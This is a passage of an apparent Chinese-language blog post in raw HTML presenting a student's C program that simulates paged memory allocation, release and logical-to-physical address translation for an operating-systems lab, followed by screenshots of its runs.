class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ProcessList</span> //进程属性</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">int</span> ID; <span class="comment">//进程号</span></span><br><span class="line"><span class="type">int</span> Size; <span class="comment">//进程大小</span></span><br><span class="line"><span class="type">int</span> Pages; <span class="comment">//所需页数</span></span><br><span class="line"><span class="type">int</span> Page[<span class="number">100</span>]; <span class="comment">//页表 </span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProcessList</span> *<span class="title">next</span>;</span> <span class="comment">//下一进程指针</span></span><br><span class="line">&#125;Process;</span><br></pre></td></tr></table></figure><h4 id="进程队列"><a href="#进程队列" class="headerlink" title="进程队列"></a>进程队列</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Process *head=<span class="literal">NULL</span>; <span class="comment">//进程队列</span></span><br></pre></td></tr></table></figure><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="初始化进程、分配内存"><a href="#初始化进程、分配内存" class="headerlink" title="初始化进程、分配内存"></a>初始化进程、分配内存</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InitProcess</span><span class="params">()</span> <span class="comment">//初始化进程</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> num,RandomNumber;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please enter the number of processes:\n&quot;</span>); </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">    <span class="keyword">if</span>(num&lt;<span class="number">5</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        yellow_printf(<span class="string">&quot;The number of processes is at least 5, please re-enter it:\n&quot;</span>);</span><br><span class="line">        <span class="comment">// num=0;</span></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">    &#125;</span><br><span class="line">Process *temp;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;num;i++)</span><br><span class="line">&#123;</span><br><span class="line">temp = (Process*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Process));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;----------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter the sequence number and size of the process:\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;temp-&gt;ID,&amp;temp-&gt;Size);</span><br><span class="line"><span class="keyword">if</span>(i&gt;<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">Process *check;</span><br><span class="line">check=head;</span><br><span class="line"><span class="keyword">while</span> (check != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(temp-&gt;ID==check-&gt;ID)</span><br><span class="line">&#123;</span><br><span class="line">red_printf(<span class="string">&quot;The process already exists, please re-enter it:\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;temp-&gt;ID,&amp;temp-&gt;Size);</span><br><span class="line"><span class="keyword">if</span>(temp-&gt;ID!=check-&gt;ID) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">check=check-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">//计算进程所需的页数</span></span><br><span class="line"><span class="keyword">if</span>(temp-&gt;Size%SIZE==<span class="number">0</span>) <span class="comment">//能整除</span></span><br><span class="line">&#123;</span><br><span class="line">temp-&gt;Pages = temp-&gt;Size/SIZE; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="comment">//不足一页的部分另起一页</span></span><br><span class="line">&#123;</span><br><span class="line">temp-&gt;Pages = temp-&gt;Size/SIZE+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">temp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">//空块管理 </span></span><br><span class="line"><span class="keyword">if</span>(temp-&gt;Pages&lt;BlankBlockNum)</span><br><span class="line">&#123;</span><br><span class="line">BlankBlockNum -=temp-&gt;Pages;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">red_printf(<span class="string">&quot;Sorry,there is not enough memory space to allocate!\n&quot;</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//分配内存 </span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;temp-&gt;Pages;j++)</span><br><span class="line">&#123;</span><br><span class="line">srand(time(<span class="number">0</span>)); <span class="comment">//随机数种子</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">                <span class="comment">//模拟实际内存分配不连续性（随机分配）</span></span><br><span class="line">RandomNumber = rand()%<span class="number">32768</span>;</span><br><span class="line"><span class="keyword">if</span>(BLOCK[RandomNumber]==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">temp-&gt;Page[j] = RandomNumber;</span><br><span class="line">BLOCK[RandomNumber] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">green_printf(<span class="string">&quot;Process %d memory allocation succeeded!\n&quot;</span>,temp-&gt;ID);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The page table is as follows:\n&quot;</span>);</span><br><span class="line">blue_printf(<span class="string">&quot;Page PhyBlock\n&quot;</span>); </span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;temp-&gt;Pages;j++)</span><br><span class="line">&#123;</span><br><span class="line">blue_printf(<span class="string">&quot; %d   %d\n&quot;</span>,j,temp-&gt;Page[j]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//放入进程链表 </span></span><br><span class="line"><span class="keyword">if</span>(head == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">head = temp;</span><br><span class="line">temp = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">Process *temp2;</span><br><span class="line">temp2 = head;</span><br><span class="line"><span class="keyword">while</span>(temp2-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">temp2 = temp2-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">temp2-&gt;next = temp;</span><br><span class="line">temp = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="释放内存"><a href="#释放内存" class="headerlink" title="释放内存"></a>释放内存</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Release</span><span class="params">(<span class="type">int</span> id)</span></span><br><span class="line">&#123;</span><br><span class="line">Process *temp,*temp1,*temp2;</span><br><span class="line">temp = head;</span><br><span class="line">temp1 = head-&gt;next;</span><br><span class="line"><span class="keyword">if</span>(temp-&gt;ID == id)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;temp-&gt;Pages;i++)</span><br><span class="line">&#123;</span><br><span class="line">BLOCK[temp-&gt;Page[i]] = <span class="number">0</span>;</span><br><span class="line">BlankBlockNum++;</span><br><span class="line">&#125;</span><br><span class="line">head = temp1;</span><br><span class="line"><span class="built_in">free</span>(temp);</span><br><span class="line">green_printf(<span class="string">&quot;Memory release successful!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span>(temp1)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(temp1-&gt;ID == id)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;temp1-&gt;Pages;i++)</span><br><span class="line">&#123;</span><br><span class="line">BLOCK[temp1-&gt;Page[i]] = <span class="number">0</span>;</span><br><span class="line">BlankBlockNum++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">green_printf(<span class="string">&quot;Memory release successful!\n&quot;</span>);</span><br><span class="line">temp-&gt;next = temp1-&gt;next;</span><br><span class="line"><span class="built_in">free</span>(temp1);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">temp = temp1;</span><br><span class="line">temp1=temp1-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">temp2 = head;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The current process memory allocation is as follows:\n&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>(temp2 != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">yellow_printf(<span class="string">&quot;Process %d\n&quot;</span>,temp2-&gt;ID);</span><br><span class="line">blue_printf(<span class="string">&quot;Page PhyBlock\n&quot;</span>); </span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;temp2-&gt;Pages;j++)</span><br><span class="line">&#123;</span><br><span class="line">blue_printf(<span class="string">&quot; %d   %d\n&quot;</span>,j,temp2-&gt;Page[j]);</span><br><span class="line">&#125;</span><br><span class="line">temp2 = temp2-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h4 id="分配内存"><a href="#分配内存" class="headerlink" title="分配内存"></a>分配内存</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> RandomNumber;</span><br><span class="line">Process *temp;</span><br><span class="line">temp = (Process*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Process));</span><br><span class="line"><span class="comment">// printf(&quot;----------------------------------------------------------------------\n&quot;);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter the sequence number and size of the process:\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;temp-&gt;ID,&amp;temp-&gt;Size);</span><br><span class="line"></span><br><span class="line">Process *check;</span><br><span class="line">check=head;</span><br><span class="line"><span class="keyword">while</span> (check != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(temp-&gt;ID==check-&gt;ID)</span><br><span class="line">&#123;</span><br><span class="line">red_printf(<span class="string">&quot;The process already exists, please re-enter it:\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;temp-&gt;ID,&amp;temp-&gt;Size);</span><br><span class="line"><span class="keyword">if</span>(temp-&gt;ID!=check-&gt;ID) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">check=check-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//计算进程所需的页数</span></span><br><span class="line"><span class="keyword">if</span>(temp-&gt;Size%SIZE==<span class="number">0</span>) <span class="comment">//能整除</span></span><br><span class="line">&#123;</span><br><span class="line">temp-&gt;Pages = temp-&gt;Size/SIZE; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="comment">//不足一页的部分另起一页</span></span><br><span class="line">&#123;</span><br><span class="line">temp-&gt;Pages = temp-&gt;Size/SIZE+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">temp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">//空块管理 </span></span><br><span class="line"><span class="keyword">if</span>(temp-&gt;Pages&lt;BlankBlockNum)</span><br><span class="line">&#123;</span><br><span class="line">BlankBlockNum -=temp-&gt;Pages;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">red_printf(<span class="string">&quot;Sorry,there is not enough memory space to allocate!\n&quot;</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//分配内存 </span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;temp-&gt;Pages;j++)</span><br><span class="line">&#123;</span><br><span class="line">srand(time(<span class="number">0</span>)); <span class="comment">//随机数种子</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//模拟实际内存分配不连续性（随机分配）</span></span><br><span class="line">RandomNumber = rand()%<span class="number">32768</span>;</span><br><span class="line"><span class="keyword">if</span>(BLOCK[RandomNumber]==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">temp-&gt;Page[j] = RandomNumber;</span><br><span class="line">BLOCK[RandomNumber] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">green_printf(<span class="string">&quot;Process %d memory allocation succeeded!\n&quot;</span>,temp-&gt;ID);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The page table is as follows:\n&quot;</span>);</span><br><span class="line">blue_printf(<span class="string">&quot;Page PhyBlock\n&quot;</span>); </span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;temp-&gt;Pages;j++)</span><br><span class="line">&#123;</span><br><span class="line">blue_printf(<span class="string">&quot; %d   %d\n&quot;</span>,j,temp-&gt;Page[j]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//放入进程链表 </span></span><br><span class="line"><span class="keyword">if</span>(head == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">head = temp;</span><br><span class="line">temp = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">Process *temp2;</span><br><span class="line">temp2 = head;</span><br><span class="line"><span class="keyword">while</span>(temp2-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">temp2 = temp2-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">temp2-&gt;next = temp;</span><br><span class="line">temp = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="逻辑地址转物理地址"><a href="#逻辑地址转物理地址" class="headerlink" title="逻辑地址转物理地址"></a>逻辑地址转物理地址</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">AddressTranslation</span><span class="params">(<span class="type">int</span> id,<span class="type">int</span> LogAddress)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> PhyAddress,P,W;</span><br><span class="line">Process *temp;</span><br><span class="line">temp = head;</span><br><span class="line"><span class="keyword">while</span>(temp != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(temp-&gt;ID == id)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(LogAddress &gt; temp-&gt;Size)</span><br><span class="line">&#123;</span><br><span class="line">red_printf(<span class="string">&quot;Break out of bounds!\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//物理地址=页号*块大小(4K)+偏移量(逻辑地址)</span></span><br><span class="line">P = LogAddress / SIZE;</span><br><span class="line">W = LogAddress % SIZE;</span><br><span class="line">PhyAddress = temp-&gt;Page[P]*SIZE+W;</span><br><span class="line">purple_printf(<span class="string">&quot;Calculator: PhyAddress=%d×4K+%d\n&quot;</span>,temp-&gt;Page[P],W);</span><br><span class="line">yellow_printf(<span class="string">&quot;PhyAddress:%d\n&quot;</span>,PhyAddress);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">temp = temp-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(temp == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">red_printf(<span class="string">&quot;The process does not exist!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">showBlocks</span><span class="params">()</span>； <span class="comment">// 显示空块数和占用数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">showMemory</span><span class="params">()</span>； <span class="comment">// 显示内存分配</span></span><br></pre></td></tr></table></figure><h4 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">yellow_printf(<span class="string">&quot;Welcome!\n&quot;</span>);</span><br><span class="line">InitProcess(); <span class="comment">//初始化进程并分配内存</span></span><br><span class="line"><span class="comment">//Manage();</span></span><br><span class="line"><span class="type">int</span> n,id,LogAddress;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;----------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please enter the sequence number of the operation you want to perform:\n1.Free up memory\n2.View physical address\n3.View free blocks\n4.Exit\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line"><span class="keyword">switch</span>(n)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please enter the ID of the process you want to release:\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;id);</span><br><span class="line">Release(id);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter the process ID and logical address:\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;id,&amp;LogAddress);</span><br><span class="line">AddressTranslation(id,LogAddress);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">showBlocks();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">yellow_printf(<span class="string">&quot;Have a nice day!\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">red_printf(<span class="string">&quot;Error!Without this choice!\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><h4 id="创新点"><a href="#创新点" class="headerlink" title="创新点"></a>创新点</h4><ol><li>支持动态维护管理</li><li>支持实时向内存添加和释放进程</li><li>可以随时查看当前内存分配和空块数</li><li>程序输出字体颜色根据提示信息有所不同</li></ol><h4 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h4><p><img src="https://www.freeimg.cn/i/2023/12/19/658137ac76f75.png" alt="初始化"></p><h4 id="查看进程-1-物理地址"><a href="#查看进程-1-物理地址" class="headerlink" title="查看进程 1 物理地址"></a>查看进程 1 物理地址</h4><p><img src="https://www.freeimg.cn/i/2023/12/19/658137c0d3582.png" alt="2"></p><h4 id="释放进程-1-内存空间"><a href="#释放进程-1-内存空间" class="headerlink" title="释放进程 1 内存空间"></a>释放进程 1 内存空间</h4><p><img src="https://www.freeimg.cn/i/2023/12/19/658137dc6ed90.png" alt="1"></p><h4 id="再次查看进程-1"><a href="#再次查看进程-1" class="headerlink" title="再次查看进程 1"></a>再次查看进程 1</h4><p><img src="https://www.freeimg.cn/i/2023/12/19/658137ec41baa.png" alt="2.1"></p><p>发现进程不存在</p><h4 id="查看当前内存分配"><a href="#查看当前内存分配" class="headerlink" title="查看当前内存分配"></a>查看当前内存分配</h4><p><img src="https://www.freeimg.cn/i/2023/12/19/6581387469188.png" alt="5"></p><h4 id="添加进程"><a href="#添加进程" class="headerlink" title="添加进程"></a>添加进程</h4><p><img src="https://www.freeimg.cn/i/2023/12/19/658138810f3c9.png" alt="6"></p><h4 id="退出程序"><a href="#退出程序" class="headerlink" title="退出程序"></a>退出程序</h4><p><img src="https://www.freeimg.cn/i/2023/12/19/658138635d93a.png" alt="4"></p><h2 id="规范性输入"><a href="#规范性输入" class="headerlink" title="规范性输入"></a>规范性输入</h2><h4 id="实验要求进程数至少为5"><a href="#实验要求进程数至少为5" class="headerlink" title="实验要求进程数至少为5"></a>实验要求进程数至少为5</h4><p><img src="https://www.freeimg.cn/i/2023/12/19/65813894e8ef7.png" alt="进程少于5"></p><h4 id="进程重复"><a href="#进程重复" class="headerlink" title="进程重复"></a>进程重复</h4><p><img src="https://www.freeimg.cn/i/2023/12/19/658138b82ca95.png" alt="4"></p><h4 id="逻辑地址溢出"><a 